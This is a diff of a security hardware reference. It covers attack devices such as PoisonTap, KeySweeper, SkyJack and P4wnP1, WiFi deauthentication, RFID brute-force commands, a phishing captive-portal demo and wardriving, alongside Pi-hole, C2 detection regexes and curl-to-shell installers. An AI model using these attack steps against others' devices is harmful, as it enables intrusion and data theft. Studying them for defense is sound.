+Defense: All modern openers should use rolling codes. Fixed-code systems should be replaced.
 
 ### 4.4 SkyJack
 
 SkyJack is a drone hijacking proof-of-concept demonstrating the security vulnerability in the Parrot AR.Drone's unauthenticated WiFi control protocol.
 
-**Components:**
+Components:
 - Raspberry Pi (any model)
 - Two wireless network adapters (one for scanning/deauth, one for connecting)
 - Node.js control software
 - `aircrack-ng` suite
 
-**Attack sequence:**
+Attack sequence:
 1. Scan 2.4 GHz spectrum for Parrot AR.Drone access points (SSID: `ardrone2_XXXXXX`)
 2. Identify connected controller (phone/tablet) MAC address
 3. Deauthenticate the legitimate controller from the drone's AP
 4. Connect SkyJack to the now-ownerless drone
 5. Send control commands via Node.js to assume full control
 
-**Security lesson:** Consumer drones lacked authentication between controller and aircraft. Demonstrated the importance of mutual authentication in wireless control systems.
+Security lesson: Consumer drones lacked authentication between controller and aircraft. Demonstrated the importance of mutual authentication in wireless control systems.
 
-**Open-source:** `github.com/samyk/skyjack`
+Open-source: `github.com/samyk/skyjack`
 
 ### 4.5 PoisonTap
 
 PoisonTap exploits browser caching and USB network adapter auto-configuration to siphon cookies and install persistent backdoors, even on locked computers.
 
-**Hardware:** Raspberry Pi Zero + USB OTG cable
+Hardware: Raspberry Pi Zero + USB OTG cable
 
-**Attack sequence:**
+Attack sequence:
 1. Plug PoisonTap into locked/unattended computer
 2. OS auto-configures Pi Zero as USB Ethernet adapter (RNDIS/ECM)
 3. Pi claims to be the default gateway for all IP ranges
-4. Background browser tabs make HTTP requests — PoisonTap intercepts them
+4. Background browser tabs make HTTP requests: PoisonTap intercepts them
 5. Cookies from Alexa top 1,000,000 websites are captured
 6. Browser cache is poisoned with a persistent service worker that:
    - Intercepts all future HTTP requests to those domains
    - Installs WebSocket backdoor accessible over the internet
 
-**Why it works on locked computers:**
+Why it works on locked computers:
 - Many browsers continue making HTTP requests in the background even when the screen is locked
 - OS USB network stack configures new adapters without user interaction
 - Service workers persist across browser restarts
 
-**Mitigations:** Full-disk encryption alone does not protect against this (OS still auto-configures USB). Disable USB networking on locked workstations, use HTTPS-only browsing, deploy Content-Security-Policy headers.
+Mitigations: Full-disk encryption alone does not protect against this (OS still auto-configures USB). Disable USB networking on locked workstations, use HTTPS-only browsing, deploy Content-Security-Policy headers.
 
-**Open-source:** `github.com/samyk/poisontap`
+Open-source: `github.com/samyk/poisontap`
 
 ### 4.6 KeySweeper
 
 KeySweeper is a covert Microsoft wireless keyboard sniffer disguised as a USB wall charger.
 
-**Hardware:** Arduino + nRF24L01+ 2.4 GHz radio module + USB phone charger enclosure
+Hardware: Arduino + nRF24L01+ 2.4 GHz radio module + USB phone charger enclosure
 
-**How it works:**
+How it works:
 - Microsoft's 2.4 GHz wireless keyboards (pre-2011 models) transmit keystrokes unencrypted using a simple proprietary protocol
 - nRF24L01+ can operate in promiscuous mode to scan all 2.4 GHz channels
 - Keystrokes are decoded and logged
 
-**Data exfiltration options:**
+Data exfiltration options:
 - MicroSD card local storage (retrieved when physically collecting device)
-- SMS via cellular module (SIM800L) — sends keystroke logs to attacker's phone
+- SMS via cellular module (SIM800L): sends keystroke logs to attacker's phone
 - WiFi upload to remote server
 
-**Defense:** Use Bluetooth keyboards with encryption, or wired keyboards in sensitive environments. Microsoft's newer wireless keyboards use AES encryption.
+Defense: Use Bluetooth keyboards with encryption, or wired keyboards in sensitive environments. Microsoft's newer wireless keyboards use AES encryption.
 
-**Open-source:** `github.com/samyk/keysweeper`
+Open-source: `github.com/samyk/keysweeper`
 
 ### 4.7 USBdriveby
 
 USBdriveby uses a Teensy microcontroller to install a backdoor and override DNS settings on a locked Mac in seconds.
 
-**Hardware:** Teensy 2.0 or 3.x
+Hardware: Teensy 2.0 or 3.x
 
-**Capabilities demonstrated:**
+Capabilities demonstrated:
 - HID injection on locked macOS (screen lock can be bypassed via HID while active)
 - DNS override via `networksetup` commands
 - Backdoor installation with persistence
 
-**Research value:** Demonstrates that screen locks without firmware/OS-level USB blocking cannot prevent HID-based attacks.
+Research value: Demonstrates that screen locks without firmware/OS-level USB blocking cannot prevent HID-based attacks.
 
 ### 4.8 Evercookie
 
 Evercookie is a JavaScript API demonstrating extreme browser tracking persistence by storing identifying data in 20+ browser storage locations simultaneously.
 
-**Storage mechanisms used:**
+Storage mechanisms used:
 - Standard cookies
 - Local Storage
 - Session Storage
@@ -800,11 +800,11 @@ Evercookie is a JavaScript API demonstrating extreme browser tracking persistenc
 - window.name persistence
 - CSS visited link history
 
-**Security research relevance:** Demonstrates that clearing cookies is insufficient for privacy. Exposes browser architecture weaknesses that enable cross-site tracking. Influenced browser privacy improvements in modern engines.
+Security research relevance: Demonstrates that clearing cookies is insufficient for privacy. Exposes browser architecture weaknesses that enable cross-site tracking. Influenced browser privacy improvements in modern engines.
 
-**Open-source:** `github.com/samyk/evercookie`
+Open-source: `github.com/samyk/evercookie`
 
-### 4.9 XSS Worm — Historical Reference
+### 4.9 XSS Worm: Historical Reference
 
 In 2005, Samy Kamkar created the first self-propagating XSS worm on MySpace, which infected over one million profiles in approximately 20 hours. The worm demonstrated:
 
@@ -823,13 +823,13 @@ DNS-level filtering is one of the most effective and efficient methods for netwo
 
 Pi-hole is a network-wide DNS sinkhole that blocks advertisements and malicious domains for all devices on the network by acting as the DNS resolver.
 
-**Core architecture:**
-- **FTLDNS** — Fork of `dnsmasq` modified for Pi-hole's enhanced query logging and blocking. "Faster Than Light" DNS (FTL) processes queries with minimal overhead.
-- **Admin interface** — Web UI at `http://pi.hole/admin` (or `http://[Pi-IP]/admin`) providing real-time query graphs, top blocked domains, per-client statistics.
-- **Blocklist management** — Aggregates multiple blocklist sources into a unified `gravity.db` SQLite database.
-- **Query logging** — All DNS queries logged to SQLite database for retrospective analysis.
+Core architecture:
+- FTLDNS: Fork of `dnsmasq` modified for Pi-hole's enhanced query logging and blocking. "Faster Than Light" DNS (FTL) processes queries with minimal overhead.
+- Admin interface: Web UI at `http://pi.hole/admin` (or `http://[Pi-IP]/admin`) providing real-time query graphs, top blocked domains, per-client statistics.
+- Blocklist management: Aggregates multiple blocklist sources into a unified `gravity.db` SQLite database.
+- Query logging: All DNS queries logged to SQLite database for retrospective analysis.
 
-**Query flow:**
+Query flow:
 ```
 Client -> Pi-hole DNS:53 -> Check gravity.db -> [BLOCKED] -> Return 0.0.0.0/::
                                               -> [ALLOWED] -> Forward to upstream DNS -> Return answer
@@ -837,13 +837,13 @@ Client -> Pi-hole DNS:53 -> Check gravity.db -> [BLOCKED] -> Return 0.0.0.0/::
 
 ### 5.2 Installation
 
-**Standard installation (Raspberry Pi OS / Debian / Ubuntu):**
+Standard installation (Raspberry Pi OS / Debian / Ubuntu):
 ```bash
 curl -sSL https://install.pi-hole.net | bash
 # Interactive installer, sets static IP, selects upstream DNS, configures blocklists
 ```
 
-**Docker deployment:**
+Docker deployment:
 ```bash
 docker run -d \
   --name pihole \
@@ -859,7 +859,7 @@ docker run -d \
   pihole/pihole:latest
 ```
 
-**Essential management commands:**
+Essential management commands:
 ```bash
 pihole -g                    # Update gravity (download/update blocklists)
 pihole -w domain.com         # Whitelist a domain
@@ -882,7 +882,7 @@ pihole -a -p newpassword     # Change web interface password
 | Malware Domain List | `https://www.malwaredomainlist.com/hostslist/hosts.txt` | Malware C2 |
 | URLhaus | `https://urlhaus-api.abuse.ch/v1/unixsocket/` | Active malware URLs |
 
-**Gravity update automation:**
+Gravity update automation:
 ```bash
 # Crontab entry for weekly gravity update
 0 3 * * 0 root /usr/local/bin/pihole -g > /var/log/pihole_gravity.log 2>&1
@@ -890,7 +890,7 @@ pihole -a -p newpassword     # Change web interface password
 
 ### 5.4 Security Configuration
 
-**Upstream DNS with privacy and security:**
+Upstream DNS with privacy and security:
 ```bash
 # Use Cloudflare DNS over HTTPS (via cloudflared)
 apt install cloudflared
@@ -902,19 +902,19 @@ cloudflared service install
 # 149.112.112.112 -- alternate
 ```
 
-**DNSSEC validation (Pi-hole admin > DNS > Advanced):**
+DNSSEC validation (Pi-hole admin > DNS > Advanced):
 - Enable DNSSEC to cryptographically validate DNS responses
 - Prevents DNS cache poisoning and response spoofing
 - Requires upstream resolver to support DNSSEC (Cloudflare, Quad9, Google all do)
 
-**Per-client group policies:**
+Per-client group policies:
 ```
 # Pi-hole Groups allow different blocking policies per device
 # Example: children's devices get stricter lists, IoT gets malware-only
 Admin UI -> Groups -> Create group -> Assign clients -> Assign blocklists
 ```
 
-**Regex blocking for DGA detection:**
+Regex blocking for DGA detection:
 ```bash
 # Block algorithmically generated domains (common C2 pattern)
 pihole --regex '^[a-z]{10,}\.(com|net|org|info)$'
@@ -923,7 +923,7 @@ pihole --regex '^[0-9a-z]{12,16}\.pw$'
 
 ### 5.5 Security Monitoring with Pi-hole
 
-**Query log analysis for C2 beaconing detection:**
+Query log analysis for C2 beaconing detection:
 ```bash
 # Examine FTL database for high-frequency single-destination queries (beaconing pattern)
 sqlite3 /etc/pihole/FTL.db "
@@ -943,7 +943,7 @@ ORDER BY timestamp DESC
 LIMIT 100;"
 ```
 
-**Pi-hole API for SIEM integration:**
+Pi-hole API for SIEM integration:
 ```bash
 # Get statistics via API
 curl -s "http://pi.hole/admin/api.php?summary&auth=YOUR_TOKEN" | jq .
@@ -957,7 +957,7 @@ curl -s "http://pi.hole/admin/api.php?getAllQueries=3600&auth=YOUR_TOKEN" | jq .
 
 ### 5.6 Alternatives and Complements
 
-**AdGuard Home:**
+AdGuard Home:
 ```bash
 # Cross-platform (Linux, macOS, Windows, Docker)
 curl -s -S -L https://raw.githubusercontent.com/AdguardTeam/AdGuardHome/master/scripts/install.sh | sh
@@ -965,7 +965,7 @@ curl -s -S -L https://raw.githubusercontent.com/AdguardTeam/AdGuardHome/master/s
 # Per-client statistics, parental controls, safe browsing
 ```
 
-**Blocky:**
+Blocky:
 ```yaml
 # Go-based, Prometheus metrics, Kubernetes-native
 # /etc/blocky/config.yml
@@ -986,7 +986,7 @@ prometheus:
   path: /metrics
 ```
 
-**pfBlockerNG (pfSense/OPNsense):**
+pfBlockerNG (pfSense/OPNsense):
 - Integrates DNS/IP blocking directly into firewall rules
 - Supports DNSBL (DNS-based blackhole list) with Pi-hole-equivalent functionality
 - Also blocks at IP level via firewall tables
@@ -1044,7 +1044,7 @@ Off-grid and resilient communication networks are essential for security operati
 
 Meshtastic is an open-source LoRa mesh networking platform enabling long-range, encrypted text messaging without internet infrastructure.
 
-**Supported hardware:**
+Supported hardware:
 
 | Board | Chipset | Notes |
 |-------|---------|-------|
@@ -1054,7 +1054,7 @@ Meshtastic is an open-source LoRa mesh networking platform enabling long-range, 
 | RAK WisBlock | nRF52840 + LoRa | Modular, low-power |
 | LilyGO T-Echo | nRF52840 + LoRa + E-ink | E-ink display, excellent battery |
 
-**Frequency plans:**
+Frequency plans:
 
 | Region | Frequency | Channel Width |
 |--------|-----------|---------------|
@@ -1063,7 +1063,7 @@ Meshtastic is an open-source LoRa mesh networking platform enabling long-range, 
 | EU_433 | 433.175-434.665 MHz | 125 kHz |
 | ANZ | 915-928 MHz | 250 kHz |
 
-**Python CLI usage:**
+Python CLI usage:
 
 ```bash
 pip install meshtastic
@@ -1090,7 +1090,7 @@ meshtastic --qr
 meshtastic --set lora.region US
 ```
 
-**Python API for automation:**
+Python API for automation:
 
 ```python
 import meshtastic
@@ -1110,13 +1110,13 @@ iface = meshtastic.serial_interface.SerialInterface("/dev/ttyUSB0")
 iface.sendText("Hello from Python API")
 ```
 
-**Security features:**
-- **AES-256 encryption** on all channels (pre-shared key)
+Security features:
+- AES-256 encryption on all channels (pre-shared key)
 - Channel name + PSK must match for nodes to communicate
 - Admin channel separate from messaging channels
 - Optional PKI-based direct messages in newer firmware
 
-**MQTT bridge:**
+MQTT bridge:
 ```bash
 # Bridge mesh to internet MQTT broker for extended range
 meshtastic --set mqtt.enabled true
@@ -1126,16 +1126,16 @@ meshtastic --set mqtt.password pass
 meshtastic --set mqtt.encryption_enabled true
 ```
 
-**Range:** 10+ miles line-of-sight, 1-2 miles urban with obstacles. Mesh relay extends effective range proportionally with node count.
+Range: 10+ miles line-of-sight, 1-2 miles urban with obstacles. Mesh relay extends effective range proportionally with node count.
 
 ### 6.2 GoTenna Mesh
 
 GoTenna Mesh is a commercial off-grid mesh radio product for Android/iOS.
 
-- **Range:** 1 km urban, 4+ miles open terrain
-- **SDK integration** for custom application development
-- **AES-256 encryption** on all messages
-- **GPS location sharing** integrated
+- Range: 1 km urban, 4+ miles open terrain
+- SDK integration for custom application development
+- AES-256 encryption on all messages
+- GPS location sharing integrated
 - Widely used in disaster response and field security operations
 - No subscription fees for peer-to-peer use
 
@@ -1143,14 +1143,14 @@ GoTenna Mesh is a commercial off-grid mesh radio product for Android/iOS.
 
 Reticulum is a cryptography-based networking stack designed for reliable communication over long-distance, low-bandwidth radio links with built-in privacy.
 
-**Architecture:**
+Architecture:
 - Transport-agnostic: works over LoRa, packet radio, serial, I2C, TCP/IP
 - All links cryptographically authenticated and encrypted by default
-- No addresses assigned — identity derived from cryptographic keypair
+- No addresses assigned: identity derived from cryptographic keypair
 - Censorship-resistant by design
 - No central infrastructure required
 
-**Installation and usage:**
+Installation and usage:
 
 ```bash
 pip install rns nomadnet lxmf
@@ -1168,7 +1168,7 @@ rnprobe <destination_hash>
 nomadnet
 ```
 
-**Example Reticulum config:**
+Example Reticulum config:
 ```toml
 [reticulum]
   enable_transport = yes
@@ -1186,23 +1186,23 @@ nomadnet
   target_port = 4403
 ```
 
-**Applications:**
-- **NomadNet** — distributed messaging and page hosting
-- **Sideband** — mobile messaging app (Android/iOS)
-- **LXMF** — lightweight extensible message format for email-like messaging over Reticulum
+Applications:
+- NomadNet: distributed messaging and page hosting
+- Sideband: mobile messaging app (Android/iOS)
+- LXMF: lightweight extensible message format for email-like messaging over Reticulum
 
 ### 6.4 M17 Project
 
 M17 is an open-source digital voice and data radio protocol designed as a modern replacement for proprietary digital radio modes.
 
-**Specifications:**
-- **Data rate:** 4800 or 9600 baud
-- **Voice codec:** Codec2 (open-source)
-- **Modulation:** 4FSK
-- **Encryption:** Optional AES-128
-- **Metadata:** Embedded callsign, GPS coordinates, text
+Specifications:
+- Data rate: 4800 or 9600 baud
+- Voice codec: Codec2 (open-source)
+- Modulation: 4FSK
+- Encryption: Optional AES-128
+- Metadata: Embedded callsign, GPS coordinates, text
 
-**Security research relevance:**
+Security research relevance:
 - Fully open protocol enables scrutiny and improvement
 - Replaces proprietary DMR/D-STAR/P25/Fusion with auditable stack
 - SDR implementations available for GNU Radio
@@ -1211,13 +1211,13 @@ M17 is an open-source digital voice and data radio protocol designed as a modern
 
 APRS is an AX.25-based digital communications system for real-time position tracking, messaging, and telemetry over amateur radio.
 
-**Specifications:**
-- **Frequency:** 144.390 MHz (North America VHF primary)
-- **Protocol:** AX.25 packet radio
-- **Modulation:** 1200 baud AFSK (Bell 202)
-- **Uses:** Position beaconing, weather stations, messaging, emergency communications
+Specifications:
+- Frequency: 144.390 MHz (North America VHF primary)
+- Protocol: AX.25 packet radio
+- Modulation: 1200 baud AFSK (Bell 202)
+- Uses: Position beaconing, weather stations, messaging, emergency communications
 
-**Dire Wolf software TNC:**
+Dire Wolf software TNC:
 
 ```bash
 # Install Dire Wolf
@@ -1234,35 +1234,35 @@ BEACON DELAY=30 EVERY=10 VIA=WIDE1-1,WIDE2-1 SYMBOL=/> COMMENT="Security Researc
 direwolf -c /etc/direwolf.conf
 ```
 
-**APRS applications:**
-- **Xastir** — full-featured APRS mapping (Linux)
-- **APRSdroid** — Android APRS client
-- **aprs.fi** — web-based APRS tracking
-- **YAAC** — Yet Another APRS Client (Java, cross-platform)
+APRS applications:
+- Xastir: full-featured APRS mapping (Linux)
+- APRSdroid: Android APRS client
+- aprs.fi: web-based APRS tracking
+- YAAC: Yet Another APRS Client (Java, cross-platform)
 
 ### 6.6 Winlink
 
 Winlink is an amateur radio email gateway system enabling email over HF/VHF/UHF radio links.
 
-**Transport methods:**
-- **VARA HF** — commercial high-performance HF modem (most common)
-- **VARA FM** — VHF/UHF FM version
-- **Pactor** — commercial HF modem (SCS hardware)
-- **Packet** — AX.25 packet radio (legacy, still functional)
+Transport methods:
+- VARA HF: commercial high-performance HF modem (most common)
+- VARA FM: VHF/UHF FM version
+- Pactor: commercial HF modem (SCS hardware)
+- Packet: AX.25 packet radio (legacy, still functional)
 
-**Emergency communications use:** Primary email system for ARES (Amateur Radio Emergency Service) and RACES (Radio Amateur Civil Emergency Service). Used when internet infrastructure is unavailable.
+Emergency communications use: Primary email system for ARES (Amateur Radio Emergency Service) and RACES (Radio Amateur Civil Emergency Service). Used when internet infrastructure is unavailable.
 
 ### 6.7 LoRaWAN Security
 
 LoRaWAN is a MAC layer protocol for LoRa radio networks, commonly used in IoT deployments.
 
-**Security architecture:**
-- **AES-128** session keys for MAC layer encryption
-- **Frame counter** to prevent replay attacks
-- **OTAA (Over-The-Air Activation):** Devices join using AppKey, generating session keys per-join — more secure
-- **ABP (Activation By Personalization):** Static session keys hardcoded — vulnerable to replay if counters reset
+Security architecture:
+- AES-128 session keys for MAC layer encryption
+- Frame counter to prevent replay attacks
+- OTAA (Over-The-Air Activation): Devices join using AppKey, generating session keys per-join — more secure
+- ABP (Activation By Personalization): Static session keys hardcoded: vulnerable to replay if counters reset
 
-**Security research tools:**
+Security research tools:
 
 ```bash
 # ChirpStack (open-source LoRaWAN server)
@@ -1274,8 +1274,8 @@ docker-compose up chirpstack
 # Useful for authorized testing of IoT deployments
 ```
 
-**Known vulnerabilities:**
-- ABP devices with counter reset vulnerability (device reset reuses counter — replay possible)
+Known vulnerabilities:
+- ABP devices with counter reset vulnerability (device reset reuses counter: replay possible)
 - Weak AppKey management in some IoT deployments
 - Lack of payload encryption in some applications (relying solely on MAC layer)
 - Frame injection attacks on unencrypted payloads
@@ -1296,7 +1296,7 @@ The Raspberry Pi's low cost, small form factor, and Linux support make it ideal 
 | Pi 5 | Cortex-A76 @ 2.4GHz | 4-16 GB | High-performance analysis |
 | CM4 | Cortex-A72 @ 1.5GHz | 1-8 GB | Industrial embedding |
 
-**Key accessories:**
+Key accessories:
 - Alfa AWUS036ACH (USB WiFi, monitor mode + injection)
 - RTL-SDR Blog v3 (software-defined radio)
 - USB OTG adapter (for Pi Zero in HID/storage modes)
@@ -1305,7 +1305,7 @@ The Raspberry Pi's low cost, small form factor, and Linux support make it ideal 
 
 ### 7.2 Network Security Appliances
 
-**ntopng traffic analysis:**
+ntopng traffic analysis:
 ```bash
 apt install ntopng
 # Configure: /etc/ntopng/ntopng.conf
@@ -1315,7 +1315,7 @@ apt install ntopng
 # Provides per-host/protocol traffic graphs, DPI, alerts
 ```
 
-**Zeek (formerly Bro) network security monitor:**
+Zeek (formerly Bro) network security monitor:
 ```bash
 apt install zeek
 # Configure interfaces in /etc/zeek/node.cfg
@@ -1326,7 +1326,7 @@ zeekctl status
 tail -f /var/log/zeek/conn.log | zeek-cut id.orig_h id.resp_h proto service duration
 ```
 
-**Suricata IDS/IPS:**
+Suricata IDS/IPS:
 ```bash
 apt install suricata
 
@@ -1346,14 +1346,14 @@ cat /var/log/suricata/eve.json | jq 'select(.event_type=="alert")'
 
 ### 7.3 Penetration Testing Platforms
 
-**Kali Linux ARM:**
+Kali Linux ARM:
 ```bash
 # Download from kali.org/get-kali/#kali-arm
 # Flash with dd or Raspberry Pi Imager
 dd if=kali-linux-2024.1-raspberry-pi-arm64.img of=/dev/sdX bs=4M status=progress
 ```
 
-**P4wnP1 A.L.O.A. (by MaMe82):**
+P4wnP1 A.L.O.A. (by MaMe82):
 
 P4wnP1 is a highly configurable USB attack platform for Raspberry Pi Zero (W/2W).
 
@@ -1369,7 +1369,7 @@ P4wnP1 is a highly configurable USB attack platform for Raspberry Pi Zero (W/2W)
 # - Combined HID + storage + network
 ```
 
-**P4wnP1 capabilities:**
+P4wnP1 capabilities:
 - HID keyboard injection (DuckyScript compatible)
 - Bluetooth covert channel (SPP/NAP/PAN)
 - WiFi client + AP mode simultaneously
@@ -1379,7 +1379,7 @@ P4wnP1 is a highly configurable USB attack platform for Raspberry Pi Zero (W/2W)
 
 ### 7.4 Physical Security Tools
 
-**rpi-rf (433 MHz RF control):**
+rpi-rf (433 MHz RF control):
 ```bash
 pip install rpi-rf
 
@@ -1391,22 +1391,22 @@ rpi-rf_send -g 17 -p 350 -l 0 12345678
 # -g: GPIO pin, -p: pulse length (us), -l: protocol (0=auto)
 ```
 
-**PiKVM — Remote KVM over IP:**
+PiKVM — Remote KVM over IP:
 - Connects to target via HDMI capture + USB OTG HID
 - Web interface provides remote keyboard/mouse/screen
 - Useful for authorized remote access to air-gapped systems
 - Supports ATX power control, mass storage emulation
 
-**USB Armory Mk II:**
-- **Processor:** NXP i.MX6ULZ ARM Cortex-A7 @ 900 MHz
-- **Interface:** USB-C host + USB-C client (simultaneous)
-- **Security features:** Hardware cryptographic accelerator, Secure Boot, ARM TrustZone
+USB Armory Mk II:
+- Processor: NXP i.MX6ULZ ARM Cortex-A7 @ 900 MHz
+- Interface: USB-C host + USB-C client (simultaneous)
+- Security features: Hardware cryptographic accelerator, Secure Boot, ARM TrustZone
 - Runs full Debian Linux, appears as USB device to host
 - Used for hardware security module (HSM) research, secure USB apps, key management
 
 ### 7.5 Radio Applications on Pi
 
-**RTL-SDR server (network SDR):**
+RTL-SDR server (network SDR):
 ```bash
 # Share RTL-SDR over network
 rtl_tcp -a 0.0.0.0 -p 1234 -g 40
@@ -1415,7 +1415,7 @@ rtl_tcp -a 0.0.0.0 -p 1234 -g 40
 # Use with SDR#, GQRX, or GNU Radio as source
 ```
 
-**dump1090 ADS-B receiver:**
+dump1090 ADS-B receiver:
 ```bash
 # Receive aircraft transponder signals
 apt install dump1090-mutability
@@ -1426,7 +1426,7 @@ dump1090 --net --quiet --enable-agc
 # Web interface: http://pi-ip:8080
 ```
 
-**LoRa gateway with RAK2245:**
+LoRa gateway with RAK2245:
 ```bash
 # RAK2245 is a Raspberry Pi Hat with 8-channel LoRa concentrator
 # Install ChirpStack gateway software
@@ -1436,7 +1436,7 @@ apt install chirpstack-gateway-bridge chirpstack-network-server
 
 ### 7.6 Forensics and Covert Capture
 
-**Covert packet capture:**
+Covert packet capture:
 ```bash
 # Continuous capture to rotating files (500MB each, max 10 files)
 tcpdump -i eth0 \
@@ -1449,7 +1449,7 @@ tcpdump -i eth0 \
 tcpdump -i eth0 -w capture.pcap -e -j adapter_unsynced
 ```
 
-**Wazuh HIDS agent:**
+Wazuh HIDS agent:
 ```bash
 # Install Wazuh agent for SIEM integration
 curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | apt-key add -
@@ -1459,7 +1459,7 @@ apt update && apt install wazuh-agent
 systemctl enable wazuh-agent && systemctl start wazuh-agent
 ```
 
-**Aircrack-ng suite:**
+Aircrack-ng suite:
 ```bash
 # Enable monitor mode (with compatible adapter)
 airmon-ng start wlan0
@@ -1484,16 +1484,16 @@ Hardware security research requires physical-layer tools for analyzing RFID/NFC 
 
 The Proxmark3 RDV4 is the premier open-source RFID/NFC research platform, supporting both Low Frequency (125 kHz) and High Frequency (13.56 MHz) operations.
 
-**Hardware features:**
+Hardware features:
 - Dual LF/HF antennas switchable via software
-- **Standalone mode** — executes attacks without connected computer
-- **Bluetooth add-on** — wireless client connection
+- Standalone mode: executes attacks without connected computer
+- Bluetooth add-on: wireless client connection
 - FPGA-accelerated signal processing
 - USB-C interface
 
-**Community firmware:** `github.com/RfidResearchGroup/proxmark3` (iceman fork — most feature-complete)
+Community firmware: `github.com/RfidResearchGroup/proxmark3` (iceman fork — most feature-complete)
 
-**Installation:**
+Installation:
 ```bash
 git clone https://github.com/RfidResearchGroup/proxmark3
 cd proxmark3
@@ -1502,7 +1502,7 @@ sudo make install
 proxmark3 /dev/ttyACM0
 ```
 
-**Essential commands:**
+Essential commands:
 
 ```bash
 # Auto-identify unknown card (LF or HF)
@@ -1547,7 +1547,7 @@ proxmark3 /dev/ttyACM0
 [usb] pm3 --> script run lf_em410x_brute
 ```
 
-**Standalone mode (HF_MSDSAL):**
+Standalone mode (HF_MSDSAL):
 The Proxmark3 can operate without a connected PC using standalone modes. HF_MSDSAL mode captures MifareClassic sector keys and dumps card data to internal flash, then uploads to PC when reconnected.
 
 ### 8.2 ChameleonMini/ChameleonTiny
@@ -1575,18 +1575,18 @@ LOG_MODE=MEMORY
 DOWNLOAD
 ```
 
-**Supported emulation types:**
+Supported emulation types:
 - Mifare Classic 1K / 4K
 - Mifare Ultralight
 - ISO 14443-A generic
 - ISO 15693
 - EM4100 (LF, ChameleonMini RDV with LF)
 
-**ChameleonTiny** — compact version (keychain-sized) with same core functionality.
+ChameleonTiny — compact version (keychain-sized) with same core functionality.
 
 ### 8.3 WiFi Attack Hardware
 
-**Alfa Network Adapters (monitor mode + packet injection):**
+Alfa Network Adapters (monitor mode + packet injection):
 
 | Model | Standard | Chipset | Notes |
 |-------|----------|---------|-------|
@@ -1610,7 +1610,7 @@ ip link set wlan0 up
 aireplay-ng --test wlan0mon
 ```
 
-**GL.iNet Travel Routers for Security:**
+GL.iNet Travel Routers for Security:
 
 | Model | CPU | RAM | Notes |
 |-------|-----|-----|-------|
@@ -1627,7 +1627,7 @@ opkg install tcpdump nmap aircrack-ng kismet
 
 ### 8.4 Bus Interface Tools
 
-**Bus Pirate v4:**
+Bus Pirate v4:
 
 Universal open-source serial protocol analyzer supporting SPI, I2C, UART, 1-Wire, JTAG, and raw bitbanging.
 
@@ -1650,14 +1650,14 @@ c          # I2C mode
 [0xFE]     # Scan -- shows ACK/NAK for each address
 ```
 
-**DSLogic Plus:**
+DSLogic Plus:
 - 16-channel USB logic analyzer
 - Sample rates up to 400 MHz
 - Protocol decoders: UART, SPI, I2C, 1-Wire, USB, CAN, Lin, JTAG
 - Open-source DSView software
 - Essential for analyzing unknown serial protocols on embedded systems
 
-**Black Magic Probe:**
+Black Magic Probe:
 ```bash
 # JTAG/SWD debugger with built-in GDB server
 # No OpenOCD required -- direct GDB connection
@@ -1670,7 +1670,7 @@ arm-none-eabi-gdb
 (gdb) x/10x 0x08000000        # Read memory
 ```
 
-**Total Phase Beagle:**
+Total Phase Beagle:
 - Professional USB, I2C, SPI, and CAN protocol analyzers
 - Non-intrusive hardware capture
 - Used for USB protocol research and embedded interface analysis
@@ -1682,7 +1682,7 @@ The maker community has produced a rich ecosystem of open-source security tools 
 
 ### 9.1 WiFi & Bluetooth DIY
 
-**ESP8266 Deauther (SpacehuhnTech):**
+ESP8266 Deauther (SpacehuhnTech):
 
 An educational WiFi security testing tool running on ESP8266/ESP32, demonstrating 802.11 management frame vulnerabilities.
 
@@ -1699,9 +1699,9 @@ esptool.py --port /dev/ttyUSB0 write_flash 0x0 esp8266_deauther_v3.bin
 # - Packet monitor
 ```
 
-**Security lesson:** 802.11w (Protected Management Frames) prevents deauthentication attacks. Test whether your AP has PMF enabled.
+Security lesson: 802.11w (Protected Management Frames) prevents deauthentication attacks. Test whether your AP has PMF enabled.
 
-**NodeMCU Captive Portal (WiFi Phishing Demo):**
+NodeMCU Captive Portal (WiFi Phishing Demo):
 ```cpp
 // Arduino sketch for captive portal demonstration
 #include <ESP8266WiFi.h>
@@ -1729,7 +1729,7 @@ void loop() {
 }
 ```
 
-**Sniffle BLE 5 Sniffer:**
+Sniffle BLE 5 Sniffer:
 
 Sniffle uses the Nordic nRF52840 Dongle to capture Bluetooth 5 and 4.x advertisements and connections.
 
@@ -1746,7 +1746,7 @@ python sniffle.py -e -f -a AA:BB:CC:DD:EE:FF
 python sniffle.py -e -l -o capture.pcap
 ```
 
-**GATTacker (BLE MITM for authorized testing):**
+GATTacker (BLE MITM for authorized testing):
 ```bash
 npm install -g gattacker
 ws-intercept   # Start intercept server
@@ -1756,7 +1756,7 @@ ws-connect     # Connect to target BLE device
 
 ### 9.2 Hardware Hacking Platforms
 
-**Glasgow Interface Explorer:**
+Glasgow Interface Explorer:
 ```python
 # Python-based hardware analysis tool
 pip install glasgow
@@ -1772,7 +1772,7 @@ glasgow run spi-flashrom --port A --voltage 3.3 read flash.bin
 glasgow run uart --port A --baudrate 115200 terminal
 ```
 
-**HydraBus:**
+HydraBus:
 ```bash
 # Multi-protocol Swiss army knife
 # Supports: UART, SPI, I2C, CAN, USB, SD, DAC, ADC
@@ -1783,14 +1783,14 @@ spi1> scan         # Scan SPI bus
 spi1> read 0 16    # Read 16 bytes from address 0
 ```
 
-**Bus Blaster:**
+Bus Blaster:
 - JTAG interface based on FTDI FT2232H
 - OpenOCD compatible for firmware flashing and debugging
 - Supports ARM, MIPS, x86 JTAG debugging
 
 ### 9.3 DIY Network Security
 
-**Wardriving Setup:**
+Wardriving Setup:
 ```bash
 # Hardware: Raspberry Pi + GPS dongle + Alfa adapter + power bank
 # Software stack:
@@ -1811,13 +1811,13 @@ kismet --override wardrive
 kismetdb_to_kml --in wardriving.kismet --out wardriving.kml
 ```
 
-**Pi Zero as HID Injector with P4wnP1:**
+Pi Zero as HID Injector with P4wnP1:
 - Configure payload in P4wnP1 web interface
 - Trigger: USB connect event
 - Action: Type DuckyScript payload sequence
 - Advantage: Full Linux environment enables complex multi-stage payloads
 
-**Custom OpenWrt Router for Monitoring:**
+Custom OpenWrt Router for Monitoring:
 ```bash
 # Install security packages on OpenWrt
 opkg update
@@ -1831,37 +1831,37 @@ iptables -t mangle -A PREROUTING -i br-lan -j TEE --gateway 192.168.1.100
 
 The maker community has published numerous open-source designs for security hardware accessories:
 
-**RFID shielded wallets:**
+RFID shielded wallets:
 - Faraday cage wallets blocking RFID/NFC skimming
 - Print with any filament (PLA/PETG), line with copper tape
 - Test with Proxmark3 or Flipper: card should be unreadable inside
 
-**Proxmark3 RDV4 cases:**
